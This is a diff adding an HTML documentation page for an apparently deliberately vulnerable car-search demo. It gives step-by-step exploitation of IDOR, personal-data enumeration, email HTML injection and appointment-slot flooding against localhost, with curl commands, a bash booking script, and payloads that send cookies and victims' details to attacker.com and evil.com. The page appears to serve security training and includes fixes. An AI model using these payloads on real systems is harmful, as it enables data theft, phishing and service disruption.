@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= title %></title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #1e1e2e;
+      color: #cdd6f4;
+    }
+    .navbar {
+      background-color: #181825 !important;
+      border-bottom: 1px solid #313244;
+    }
+    .card {
+      background-color: #181825;
+      border: 1px solid #313244;
+    }
+    .card-header {
+      background-color: #11111b;
+      border-bottom: 1px solid #313244;
+    }
+    .alert-danger {
+      background-color: #f38ba8;
+      border-color: #f38ba8;
+      color: #11111b;
+    }
+    .alert-info {
+      background-color: #89b4fa;
+      border-color: #89b4fa;
+      color: #11111b;
+    }
+    .alert-warning {
+      background-color: #f9e2af;
+      border-color: #f9e2af;
+      color: #11111b;
+    }
+    code {
+      background-color: #313244;
+      color: #b4befe;
+      padding: 0.2rem 0.4rem;
+      border-radius: 3px;
+    }
+    pre {
+      background-color: #11111b;
+      border: 1px solid #313244;
+      border-radius: 6px;
+      padding: 1rem;
+      color: #cdd6f4;
+    }
+    .vulnerability-badge {
+      background-color: #f38ba8;
+      color: #11111b;
+      font-size: 0.75rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 3px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+    .severity-high {
+      background-color: #f38ba8;
+      color: #11111b;
+    }
+    .table-dark {
+      --bs-table-bg: #181825;
+      --bs-table-border-color: #313244;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark">
+    <div class="container">
+      <a class="navbar-brand" href="/demo1">
+        AutoFinder Documentation
+      </a>
+      <div class="navbar-nav ms-auto">
+        <a class="nav-link" href="/demo1">
+          [>] Launch Demo
+        </a>
+        <a class="nav-link" href="/">← Back to Demos</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container mt-4">
+    <div class="row">
+      <div class="col-12">
+        <!-- Table of Contents -->
+        <div class="card mb-4" style="border: 2px solid #89b4fa;">
+          <div class="card-header" style="background-color: #89b4fa;">
+            <h5 class="mb-0" style="color: #11111b;">
+              <i class="bi bi-list-ul me-2"></i>Table of Contents
+            </h5>
+          </div>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-md-6">
+                <h6 class="text-primary">Vulnerability Exploitations</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#idor-saved-searches" class="text-decoration-none">1. IDOR - Accessing Other Users' Saved Searches</a></li>
+                  <li><a href="#saved-cars-access" class="text-decoration-none">2. Saved Cars/Searches Access</a></li>
+                  <li><a href="#user-profile-theft" class="text-decoration-none">3. User Profile Data Theft</a></li>
+                  <li><a href="#user-enumeration-demo" class="text-decoration-none">   ↳ Interactive User Enumeration Demo</a></li>
+                  <li><a href="#email-html-injection" class="text-decoration-none">4. Email HTML Injection & Phishing Attack</a></li>
+                  <li><a href="#dos-attack-technical" class="text-decoration-none">5. Appointment DOS Attack - Technical Details</a></li>
+                  <li><a href="#dos-attack-demo" class="text-decoration-none">   ↳ Interactive DOS Attack Demo</a></li>
+                </ul>
+              </div>
+              <div class="col-md-6">
+                <h6 class="text-primary">Attack Techniques</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#mass-data-extraction" class="text-decoration-none">Mass Data Extraction</a></li>
+                  <li><a href="#email-injection-examples" class="text-decoration-none">Email Injection Examples</a></li>
+                  <li><a href="#appointment-flooding" class="text-decoration-none">Appointment System Flooding</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Resources</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#mitigation-strategies" class="text-decoration-none">Mitigation Strategies</a></li>
+                  <li><a href="#sample-user-ids" class="text-decoration-none">Sample User IDs for Testing</a></li>
+                </ul>
+                
+                <h6 class="text-primary mt-4">Quick Navigation</h6>
+                <ul class="list-unstyled">
+                  <li><a href="#vulnerability-table" class="text-decoration-none">📊 Vulnerability Summary Table</a></li>
+                  <li><a href="#idor-saved-searches" class="text-decoration-none">🔓 Start with IDOR Attack</a></li>
+                  <li><a href="/demo1" class="text-decoration-none">🔍 Try the AutoFinder Demo</a></li>
+                  <li><a href="/demo1/appt-dos-attack" class="text-decoration-none">💥 DOS Attack Demo</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="card">
+          <div class="card-header">
+            <h4 class="mb-0">
+              [!] AutoFinder Security Documentation
+              <span class="vulnerability-badge severity-high ms-2">High Severity</span>
+            </h4>
+          </div>
+          <div class="card-body">
+
+            <!-- Overview -->
+            <div class="alert alert-danger">
+              <h6>WARNING: Vulnerability Overview</h6>
+              <p class="mb-0">AutoFinder is a car search platform where users can save searches and get email notifications. This demo contains multiple critical security vulnerabilities that allow attackers to <strong>steal user data</strong>, <strong>access other users' accounts</strong>, <strong>inject malicious content into emails</strong>, and <strong>perform denial of service attacks</strong> on the appointment system.</p>
+            </div>
+
+            <!-- Vulnerability Details -->
+            <h5 class="text-primary mb-3">Vulnerability Details</h5>
+            
+            <div class="table-responsive mb-4" id="vulnerability-table">
+              <table class="table table-dark table-striped">
+                <thead>
+                  <tr>
+                    <th>Vulnerability</th>
+                    <th>Severity</th>
+                    <th>Impact</th>
+                    <th>Location</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Insecure Direct Object References (IDOR)</td>
+                    <td><span class="badge bg-danger">Critical</span></td>
+                    <td>Access to other users' data</td>
+                    <td><code>/demo1/api/saved-searches/:searchId</code></td>
+                  </tr>
+                  <tr>
+                    <td>User ID Enumeration</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>Information disclosure</td>
+                    <td><code>/sell-my-car/api/customer/:userId</code></td>
+                  </tr>
+                  <tr>
+                    <td>HTML Injection in Emails</td>
+                    <td><span class="badge bg-warning">Medium</span></td>
+                    <td>Phishing, defacement</td>
+                    <td><code>/demo1/api/saved-searches</code></td>
+                  </tr>
+                  <tr>
+                    <td>Saved Searches Access (IDOR)</td>
+                    <td><span class="badge bg-danger">Critical</span></td>
+                    <td>View user's search history</td>
+                    <td><code>/demo1/saved-cars/:userId</code></td>
+                  </tr>
+                  <tr>
+                    <td>Email Notification System</td>
+                    <td><span class="badge bg-success">Info</span></td>
+                    <td>Automatic email alerts</td>
+                    <td><code>/demo1/trigger-notifications</code></td>
+                  </tr>
+                  <tr>
+                    <td>Gmail-Style Email Preview</td>
+                    <td><span class="badge bg-info">Demo</span></td>
+                    <td>Visual HTML injection demo</td>
+                    <td><code>/demo1/emails</code></td>
+                  </tr>
+                  <tr>
+                    <td>Admin Car Management</td>
+                    <td><span class="badge bg-success">Info</span></td>
+                    <td>Add new inventory</td>
+                    <td><code>/demo1/admin/add-car</code></td>
+                  </tr>
+                  <tr>
+                    <td>Appointment DOS Attack</td>
+                    <td><span class="badge bg-danger">Critical</span></td>
+                    <td>Complete service disruption</td>
+                    <td><code>/api/appointments/legacy/:dealerId</code></td>
+                  </tr>
+                  <tr>
+                    <td>DOS Attack Demo Interface</td>
+                    <td><span class="badge bg-warning">Demo</span></td>
+                    <td>Interactive DOS demonstration</td>
+                    <td><code>/demo1/appt-dos-attack</code></td>
+                  </tr>
+                  <tr>
+                    <td>Missing Authorization</td>
+                    <td><span class="badge bg-danger">High</span></td>
+                    <td>Unauthorized access</td>
+                    <td>Multiple endpoints</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+            <!-- Exploitation Guide -->
+            <h5 class="text-primary mb-3" id="exploitation-guide">Exploitation Guide</h5>
+
+            <!-- IDOR Exploitation -->
+            <div class="card mb-4" id="idor-saved-searches">
+              <div class="card-header">
+                <h6 class="mb-0">1. IDOR - Accessing Other Users' Saved Searches</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>What is IDOR?</strong> Insecure Direct Object References occur when an application provides direct access to objects based on user input without proper authorization checks.</p>
+                
+                <p><strong>The Problem:</strong> When you save a search in AutoFinder, it gets assigned a 7-digit numerical ID (like 5765321, 5765322, 5765323...). The application doesn't check if YOU own that search before showing you the data - it just shows whoever asks!</p>
+                
+                <p><strong>Why This Matters:</strong> Each saved search contains the UUID of the user who created it. These UUIDs act like session tokens throughout the application.</p>
+
+                <p><strong>Step-by-Step Exploitation:</strong></p>
+                <ol>
+                  <li><strong>Create Your Own Search:</strong> Save a search to understand how the system works</li>
+                  <li><strong>Note the Search ID:</strong> Your search gets a 7-digit ID like 5765321, for example</li>
+                  <li><strong>Try Other IDs:</strong> Request searches 5765322, 5765323, 5765324... to see other users' data</li>
+                  <li><strong>Collect User UUIDs:</strong> Each response gives you another user's UUID</li>
+                  <li><strong>Use UUIDs for Further Attacks:</strong> These UUIDs unlock more vulnerabilities</li>
+                </ol>
+
+                <p><strong>Real Attack Example:</strong></p>
+                <pre><code># Step 1: Create your own search to see the pattern
+curl -X POST "http://localhost:3000/demo1/search" \
+  -H "Content-Type: application/json" \
+  -d '{"make":"Toyota","saveName":"My Search"}'
+
+# Response shows your search got a 7-digit ID and your UUID
+# {"userId": "ab123456-78cd-9012-ef34-567890abcdef", "searchId": 5765321}
+
+# Step 2: Now try to access other users' searches using 7-digit search IDs
+curl -X GET "http://localhost:3000/demo1/api/saved-searches/5765321"
+curl -X GET "http://localhost:3000/demo1/api/saved-searches/5765322" 
+curl -X GET "http://localhost:3000/demo1/api/saved-searches/5765323"
+
+# Each response reveals another user's UUID:
+# {"id":5765321,"userId":"cd456789-01ab-2345-cdef-67890123abcd","name":"Honda Search","searchCriteria":{...}}
+# {"id":5765322,"userId":"ef789012-34cd-5678-90ab-123456789def","name":"BMW Search","searchCriteria":{...}}</code></pre>
+
+                <div class="alert alert-info">
+                  <strong>What You Get:</strong> User UUIDs, search preferences, and insight into what cars people are looking for. These UUIDs are the keys to attacking other parts of the application.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> Check if the requesting user owns the search before returning data. Add user session validation to the API endpoint.
+                </div>
+              </div>
+            </div>
+
+            <!-- Saved Cars/Searches Access -->
+            <div class="card mb-4" id="saved-cars-access">
+              <div class="card-header">
+                <h6 class="mb-0">2. Saved Cars/Searches Access</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>The Next Attack:</strong> Once you have user UUIDs from the IDOR attack above, you can use them to view all of a user's saved car searches, revealing their interests and shopping patterns.</p>
+                
+                <p><strong>What You'll Discover:</strong> Complete search history, car preferences, price ranges, and locations users are interested in.</p>
+
+                <p><strong>Why This Works:</strong> The <code>/demo1/saved-cars/:userId</code> endpoint was designed to show users their own saved searches, but it doesn't verify that YOU are that user - it shows whoever asks!</p>
+
+                <p><strong>Step-by-Step Attack:</strong></p>
+                <ol>
+                  <li><strong>Use UUIDs from Step 1:</strong> Take the user IDs you collected from the saved searches enumeration</li>
+                  <li><strong>Request Each User's Searches:</strong> Make API calls to get their complete search history</li>
+                  <li><strong>Profile Users:</strong> Build profiles based on their car preferences and shopping behavior</li>
+                  <li><strong>Target Marketing:</strong> Use this data for targeted attacks or social engineering</li>
+                </ol>
+
+                <p><strong>Complete Search History Theft:</strong></p>
+                <pre><code># From step 1, you collected these UUIDs:
+# User 1: "ab123456-78cd-9012-ef34-567890abcdef"
+# User 2: "cd456789-01ab-2345-cdef-67890123abcd"
+
+# Now view their complete search history:
+curl -X GET "http://localhost:3000/demo1/saved-cars/ab123456-78cd-9012-ef34-567890abcdef"
+
+# Response reveals everything they've searched for:
+{
+  "userId": "ab123456-78cd-9012-ef34-567890abcdef",
+  "firstName": "John",
+  "lastName": "Smith",
+  "email": "john.smith@email.com",
+  "savedSearches": [
+    {
+      "id": 5765321,
+      "name": "Dream Car Search",
+      "searchCriteria": {"make": "BMW", "minPrice": "50000", "maxPrice": "80000"},
+      "dateSaved": "2023-02-07"
+    },
+    {
+      "id": 5765340,
+      "name": null,
+      "searchCriteria": {"make": "Toyota", "zipCode": "90210"},
+      "dateSaved": "2023-02-06"
+    }
+  ]
+}
+
+# Repeat for all collected UUIDs to build complete user profiles</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Privacy Impact:</strong> You now know what cars users want to buy, their budget ranges, preferred locations, and shopping patterns. This enables targeted fraud, social engineering, and privacy violations.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> Validate that the requesting user's session matches the requested user ID. Never return another user's search history.
+                </div>
+              </div>
+            </div>
+
+            <!-- User Profile Data Theft -->
+            <div class="card mb-4" id="user-profile-theft">
+              <div class="card-header">
+                <h6 class="mb-0">3. User Profile Data Theft</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>The Next Attack:</strong> Once you have user UUIDs from the IDOR attack above, you can use them to steal complete user profiles from the "sell my car" feature.</p>
+                
+                <p><strong>What You'll Steal:</strong> Full names, email addresses, phone numbers, home zip codes, and details about cars they own.</p>
+
+                <p><strong>Why This Works:</strong> The <code>/sell-my-car/api/customer/:userId</code> endpoint was designed to show a user their own profile, but it doesn't verify that YOU are that user - it just shows whoever asks!</p>
+
+                <p><strong>Step-by-Step Data Theft:</strong></p>
+                <ol>
+                  <li><strong>Use UUIDs from Step 1:</strong> Take the user IDs you collected from the saved searches</li>
+                  <li><strong>Request Each Profile:</strong> Make API calls to get complete user data</li>
+                  <li><strong>Build a Database:</strong> Collect all the personal information</li>
+                  <li><strong>Use for Social Engineering:</strong> Armed with names, emails, phones, and car info</li>
+                </ol>
+
+                <p><strong>Complete Data Theft Example:</strong></p>
+                <pre><code># From step 1, you collected these UUIDs:
+# User 1: "ab123456-78cd-9012-ef34-567890abcdef"
+# User 2: "cd456789-01ab-2345-cdef-67890123abcd"
+
+# Now steal their complete profiles:
+curl -X GET "http://localhost:3000/sell-my-car/api/customer/ab123456-78cd-9012-ef34-567890abcdef"
+
+# Response reveals everything:
+{
+  "claimId": "ab123456-78cd-9012-ef34-567890abcdef",
+  "firstName": "John",
+  "lastName": "Smith", 
+  "email": "john.smith@email.com",
+  "phone": "555-123-4567",
+  "zipCode": "44333",
+  "ownedCars": [
+    {"make": "Honda", "model": "Civic", "year": 2019}
+  ]
+}
+
+# Repeat for all collected UUIDs to build a complete database</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Privacy Impact:</strong> You now have enough information for identity theft, social engineering attacks, targeted phishing, or selling personal data on dark markets.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> Validate that the requesting user's session matches the requested user ID. Never return another user's personal information.
+                </div>
+              </div>
+            </div>
+
+            <!-- Interactive User Enumeration Demonstration -->
+            <div class="card mb-4" style="border: 2px solid #f38ba8;" id="user-enumeration-demo">
+              <div class="card-header" style="background-color: #f38ba8;">
+                <h6 class="mb-0" style="color: #11111b;">
+                  <i class="bi bi-exclamation-triangle me-2"></i>Interactive User Enumeration Demonstration
+                  <span class="vulnerability-badge ms-2" style="background-color: #11111b; color: #f38ba8;">CRITICAL VULNERABILITY</span>
+                </h6>
+              </div>
+              <div class="card-body">
+                <div class="alert alert-danger">
+                  <h6><i class="bi bi-shield-exclamation me-2"></i>Live IDOR Attack Demonstration</h6>
+                  <p class="mb-0">This section provides an interactive demonstration of the user data enumeration vulnerability described above. You can test both single user targeting and bulk data theft scenarios.</p>
+                </div>
+                
+                <div class="row">
+                  <div class="col-md-6">
+                    <div class="mb-3">
+                      <label for="targetUserId" class="form-label">Target User ID</label>
+                      <input type="text" class="form-control" id="targetUserId" placeholder="Enter user UUID to enumerate">
+                      <div class="form-text">Use any UUID obtained from saved search IDOR attacks</div>
+                    </div>
+                    <div class="mb-3">
+                      <button type="button" class="btn btn-danger me-2" onclick="enumerateUser()">
+                        <i class="bi bi-search me-2"></i>Steal User Data
+                      </button>
+                      <button type="button" class="btn btn-outline-danger" onclick="bulkEnumerateUsers()">
+                        <i class="bi bi-list-ul me-2"></i>Bulk Data Theft
+                      </button>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="alert alert-info">
+                      <h6><i class="bi bi-info-circle me-2"></i>Attack Details</h6>
+                      <ul class="mb-0 small">
+                        <li><strong>Endpoint:</strong> /sell-my-car/api/customer/{userID}</li>
+                        <li><strong>Method:</strong> IDOR (Insecure Direct Object References)</li>
+                        <li><strong>Data Exposed:</strong> Names, emails, phones, addresses, owned cars</li>
+                        <li><strong>Authorization:</strong> None required - system doesn't verify ownership</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="row mt-4">
+                  <div class="col-md-6">
+                    <h6 class="text-primary">Demo Features:</h6>
+                    <ul>
+                      <li><strong>Single User Targeting:</strong> Extract specific user's personal data</li>
+                      <li><strong>Bulk Enumeration:</strong> Mass theft of up to 10 user profiles</li>
+                      <li><strong>Real-time Progress:</strong> Watch the data theft unfold step by step</li>
+                      <li><strong>Impact Analysis:</strong> See exactly what information gets stolen</li>
+                    </ul>
+                  </div>
+                  <div class="col-md-6">
+                    <h6 class="text-danger">Data Theft Scenarios:</h6>
+                    <ul>
+                      <li><strong>Identity Theft:</strong> Names, addresses, phone numbers</li>
+                      <li><strong>Phishing Attacks:</strong> Email addresses for targeted campaigns</li>
+                      <li><strong>Social Engineering:</strong> Personal details for convincing calls</li>
+                      <li><strong>Insurance Fraud:</strong> Vehicle ownership information</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- User Enumeration Results (Hidden Initially) -->
+            <div id="userEnumerationResults" class="card mb-4" style="display: none; border: 2px solid #f38ba8;">
+              <div class="card-header" style="background-color: #f38ba8;">
+                <h6 class="mb-0" style="color: #11111b;">
+                  <i class="bi bi-person-badge me-2"></i>Stolen User Data Results
+                </h6>
+              </div>
+              <div class="card-body">
+                <div id="userEnumerationContent"></div>
+              </div>
+            </div>
+
+            <!-- HTML Injection -->
+            <div class="card mb-4" id="email-html-injection">
+              <div class="card-header">
+                <h6 class="mb-0">4. Email HTML Injection & Phishing Attack</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>The Email Attack:</strong> AutoFinder sends email notifications when saved search criteria are met. The search name goes directly into the email HTML without any security filtering.</p>
+                
+                <p><strong>What This Means:</strong> You can create malicious saved searches for OTHER users (using their UUIDs from step 1) with HTML code in the search name. When cars matching the criteria are posted, the victims get phishing emails that look like they came from AutoFinder!</p>
+
+                <p><strong>Attack Strategy:</strong></p>
+                <ol>
+                  <li><strong>Use Stolen UUIDs:</strong> Create searches for other users using their UUIDs from steps 1-3</li>
+                  <li><strong>Inject HTML Code:</strong> Put malicious HTML/links in the search name</li>
+                  <li><strong>Set Broad Criteria:</strong> Use search criteria that will definitely match (like "any car over $1")</li>
+                  <li><strong>Trigger Notifications:</strong> Use trigger endpoint or wait for new cars to be posted</li>
+                  <li><strong>Victims Get Emails:</strong> Professional-looking emails with your malicious content embedded</li>
+                </ol>
+
+                <p><strong>Phishing Email Attack:</strong></p>
+                <pre><code># Create a malicious search for another user
+curl -X POST "http://localhost:3000/demo1/api/saved-searches" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "userId": "ab123456-78cd-9012-ef34-567890abcdef",
+    "name": "&lt;a href=\"http://acmecorp.com\"&gt;Click Here&lt;/a&gt;",
+    "searchCriteria": {
+      "make": "",
+      "minPrice": 1,
+      "maxPrice": 999999,
+      "zipCode": "",
+      "distance": "nationwide"
+    }
+  }'
+
+# Now trigger the email notifications (simulate new cars being posted)
+curl -X POST "http://localhost:3000/demo1/trigger-notifications"
+
+# Response shows emails sent:
+# {
+#   "result": "Success", 
+#   "message": "Processed 3 new cars, sent 1 notification emails",
+#   "newCars": [...]
+# }
+
+# The victim receives a professional AutoFinder email with your malicious HTML:
+# Subject: "AutoFinder - New match found!"
+# Body: "We've found a new vehicle that matches your [MALICIOUS LINK]"</code></pre>
+
+                <p><strong>Advanced Attack Examples:</strong></p>
+                <pre><code># Phishing attack - steal credentials
+"&lt;a href=\"http://acmecorp.com\"&gt;Click Here&lt;/a&gt;"
+
+# Tracking pixels - monitor email opens
+"&lt;img src=\"http://attacker.com/track?user=VICTIM_UUID\" width=\"1\" height=\"1\"&gt;Honda Search"
+
+# JavaScript injection (if emails are viewed in HTML-enabled clients)
+"&lt;script&gt;window.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;Search"
+
+# Credential harvesting with convincing message
+"&lt;a href=\"http://evil.com/verify\"&gt;URGENT: Verify your account to continue receiving match notifications&lt;/a&gt;"
+
+# Data collection
+"&lt;img src=\"http://attacker.com/collect?email=TARGET@example.com&amp;name=TARGET_NAME\"&gt;"</code></pre>
+
+                <p><strong>How the Email System Works:</strong></p>
+                <ul>
+                  <li><strong>Automatic Triggers:</strong> Emails sent when new cars match saved search criteria</li>
+                  <li><strong>Professional Templates:</strong> Official AutoFinder branding makes emails trustworthy</li>
+                  <li><strong>No Rate Limiting:</strong> Can trigger unlimited emails using the notification endpoints</li>
+                  <li><strong>Broad Matching:</strong> Low price thresholds ($1) match almost any new inventory</li>
+                  <li><strong>Direct HTML Rendering:</strong> Search names inserted directly into email HTML</li>
+                </ul>
+
+                <p><strong>Triggering Methods:</strong></p>
+                <pre><code># Method 1: Use demo trigger endpoint
+curl -X POST "http://localhost:3000/demo1/trigger-notifications"
+
+# Method 2: Add individual cars (admin endpoint)
+curl -X POST "http://localhost:3000/demo1/admin/add-car" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "make": "Honda",
+    "model": "Civic", 
+    "year": 2020,
+    "price": 15000,
+    "zipCode": "44333"
+  }'
+
+# Both methods trigger emails to users with matching saved searches</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Real-World Impact:</strong> Victims receive official-looking emails from AutoFinder containing your malicious links. Perfect for credential harvesting, malware distribution, or defacing the company's reputation.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Easy Fix:</strong> HTML-encode all user input before putting it in emails. Use text-only emails or properly sanitize HTML content.
+                </div>
+              </div>
+            </div>
+
+            <!-- Appointment DOS Attack -->
+            <div class="card mb-4" id="dos-attack-technical">
+              <div class="card-header">
+                <h6 class="mb-0">5. Appointment Denial of Service (DOS) Attack - Technical Details</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>The Appointment System:</strong> AutoFinder lets users schedule dealership appointments via the legacy API endpoint <code>/api/appointments/legacy/:dealerId</code>. The system has a business rule: one user can only have one appointment per dealership per day.</p>
+                
+                <p><strong>The Attack:</strong> Since you can collect many user UUIDs (from steps 1-3), you can use different user IDs to book ALL available appointment slots, effectively shutting down the appointment system for legitimate customers.</p>
+
+                <p><strong>Why This Works:</strong> The system only checks if a specific USER has an appointment at that dealership on that date. It doesn't verify that the person making the request is actually that user. By rotating through stolen user IDs, you can book every available time slot.</p>
+
+                <p><strong>Attack Methodology:</strong></p>
+                <ol>
+                  <li><strong>Collect User UUIDs:</strong> Use IDOR attacks from steps 1-3 to gather multiple user IDs</li>
+                  <li><strong>Target High-Value Dealerships:</strong> Focus on popular dealerships (like ID 6017)</li>
+                  <li><strong>Book All Time Slots:</strong> Use different user IDs for each appointment slot</li>
+                  <li><strong>Saturate Multiple Days:</strong> Repeat for multiple dates to maximize disruption</li>
+                </ol>
+
+                <p><strong>Complete Appointment DOS Attack:</strong></p>
+                <pre><code># Step 1: Collect user UUIDs from IDOR attacks
+USERIDS=(
+  "ab123456-78cd-9012-ef34-567890abcdef"
+  "cd456789-01ab-2345-cdef-67890123abcd" 
+  "ef789012-34cd-5678-90ab-123456789def"
+  "12345678-90ab-1234-cdef-567890123456"
+  "56789012-34cd-5678-90ab-123456789def"
+  "78901234-56ef-7890-ab12-3456789abcde"
+  "90123456-78ab-9012-cdef-567890123456"
+  "01234567-89cd-0123-ef45-6789012345ab"
+)
+
+# Step 2: Define all available time slots for a business day (30-minute intervals)
+TIMES=(
+  "09:00:00" "09:30:00" "10:00:00" "10:30:00"
+  "11:00:00" "11:30:00" "12:00:00" "12:30:00" 
+  "13:00:00" "13:30:00" "14:00:00" "14:30:00"
+  "15:00:00" "15:30:00" "16:00:00" "16:30:00"
+  "17:00:00" "17:30:00"
+)
+
+# Step 3: Target dealership 6017 (popular dealership from PDF)
+DEALERSHIP_ID="6017"
+TARGET_DATE="2023-02-07"
+
+echo "Starting appointment DOS attack on dealership $DEALERSHIP_ID for $TARGET_DATE"
+echo "Total time slots to book: ${#TIMES[@]}"
+echo "Available user IDs: ${#USERIDS[@]}"
+
+booked_count=0
+user_index=0
+
+# Step 4: Book every available time slot using different user IDs
+for time in "${TIMES[@]}"; do
+  # Rotate through user IDs to avoid conflicts
+  userid="${USERIDS[$user_index]}"
+  user_index=$(((user_index + 1) % ${#USERIDS[@]}))
+  
+  echo "Booking $time slot using user ID: ${userid:0:8}..."
+  
+  response=$(curl -s -X POST "http://localhost:3000/api/appointments/legacy/$DEALERSHIP_ID" \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"appointmentTime\": \"$time\",
+      \"appointmentDate\": \"$TARGET_DATE\",
+      \"phoneNumber\": \"555-DOS-ATTACK\",
+      \"originPageId\": \"attack_script\",
+      \"userId\": \"$userid\",
+      \"skipEmailConfirmation\": true
+    }")
+  
+  if echo "$response" | grep -q "Success"; then
+    echo "✓ Successfully booked $time slot"
+    ((booked_count++))
+  else
+    echo "✗ Failed to book $time slot: $response"
+  fi
+  
+  # Small delay to avoid overwhelming the server
+  sleep 0.2
+done
+
+echo ""
+echo "DOS Attack Complete!"
+echo "Successfully booked $booked_count out of ${#TIMES[@]} time slots (18 total slots at 30-minute intervals)"
+echo "Dealership $DEALERSHIP_ID is now fully booked for $TARGET_DATE"
+echo "Legitimate customers cannot make appointments"</code></pre>
+
+                <p><strong>Multi-Day Attack Escalation:</strong></p>
+                <pre><code># Escalate to multiple days for maximum business disruption
+DATES=("2023-02-06" "2023-02-07" "2023-02-08" "2023-02-09" "2023-02-10")
+
+for date in "${DATES[@]}"; do
+  echo "Attacking date: $date"
+  # Run the above booking script for each date
+  # This completely shuts down the dealership for an entire week
+done</code></pre>
+
+                <div class="alert alert-danger">
+                  <strong>Business Impact:</strong> Complete shutdown of appointment booking system. Legitimate customers cannot schedule appointments, leading to lost sales, frustrated customers, and damaged reputation. Customer service overwhelmed with complaints about unavailable appointments.
+                </div>
+
+                <div class="alert alert-info">
+                  <strong>Real-World Scenario:</strong> This attack simulates what happens when appointment systems don't properly validate user authorization. A single attacker with stolen user IDs can completely monopolize all available appointment slots.
+                </div>
+
+                <div class="alert alert-warning">
+                  <strong>Complete Fix Required:</strong> 1) Implement proper user authentication for appointment booking 2) Add rate limiting per IP address 3) Implement CAPTCHA verification 4) Add appointment booking confirmation via email/SMS 5) Monitor for suspicious booking patterns
+                </div>
+              </div>
+            </div>
+
+            <!-- Interactive DOS Attack Demo -->
+            <div class="card mb-4" style="border: 2px solid #f38ba8;" id="dos-attack-demo">
+              <div class="card-header" style="background-color: #f38ba8;">
+                <h6 class="mb-0" style="color: #11111b;">
+                  <i class="bi bi-exclamation-triangle me-2"></i>Interactive DOS Attack Demonstration
+                  <span class="badge" style="background-color: #f9e2af; color: #11111b;" ms-2">LIVE DEMO</span>
+                </h6>
+              </div>
+              <div class="card-body">
+                <div class="alert alert-danger">
+                  <h6><i class="bi bi-play-circle me-2"></i>Experience the Attack in Real-Time</h6>
+                  <p class="mb-3"><strong>A dedicated interface has been created to demonstrate the appointment DOS attack visually.</strong> This interactive demo shows exactly how an attacker can monopolize all appointment slots in real-time.</p>
+                  
+                  <div class="d-grid gap-2 d-md-flex justify-content-md-center">
+                    <a href="/demo1/appt-dos-attack" class="btn btn-danger btn-lg">
+                      <i class="bi bi-shield-exclamation me-2"></i>Launch DOS Attack Demo
+                    </a>
+                  </div>
+                </div>
+                
+                <div class="row mt-4">
+                  <div class="col-md-6">
+                    <h6 class="text-primary">Demo Features:</h6>
+                    <ul>
+                      <li><strong>Real-time Progress:</strong> Watch the attack unfold step by step</li>
+                      <li><strong>Visual Results:</strong> See exactly which slots are monopolized</li>
+                      <li><strong>Impact Analysis:</strong> Understand the business consequences</li>
+                      <li><strong>User ID Rotation:</strong> See how multiple stolen IDs enable the attack</li>
+                    </ul>
+                  </div>
+                  <div class="col-md-6">
+                    <h6 class="text-primary">Attack Details:</h6>
+                    <ul>
+                      <li><strong>Target:</strong> 18 appointment slots (30-min intervals)</li>
+                      <li><strong>Time Range:</strong> 9:00 AM - 5:30 PM workday</li>
+                      <li><strong>Method:</strong> 5 fake user IDs rotated for booking</li>
+                      <li><strong>Result:</strong> Complete appointment system shutdown</li>
+                    </ul>
+                  </div>
+                </div>
+                
+                <div class="alert alert-info mt-3">
+                  <strong>Educational Value:</strong> This demonstration provides a powerful visual representation of how appointment booking vulnerabilities can be exploited to cause significant business disruption. Perfect for security presentations and training.
+                </div>
+              </div>
+            </div>
+
+            <!-- Attack Scenarios -->
+            <h5 class="text-primary mb-3">Attack Scenarios</h5>
+            
+            <div class="card mb-4" id="complete-attack-chain">
+              <div class="card-header">
+                <h6 class="mb-0">Complete Attack Chain</h6>
+              </div>
+              <div class="card-body">
+                <ol>
+                  <li><strong>Reconnaissance:</strong> Perform searches to understand user ID format and get initial access</li>
+                  <li><strong>User Enumeration:</strong> Use IDOR to access saved searches and extract user IDs</li>
+                  <li><strong>Search History Theft:</strong> Use saved-cars endpoint to view users' complete search history and preferences</li>
+                  <li><strong>Data Exfiltration:</strong> Use customer API to extract full user profiles (names, emails, phones, addresses)</li>
+                  <li><strong>Email Campaign Setup:</strong> Create malicious saved searches with HTML injection for victim users</li>
+                  <li><strong>Trigger Notifications:</strong> Use trigger endpoints to send phishing emails to all victims</li>
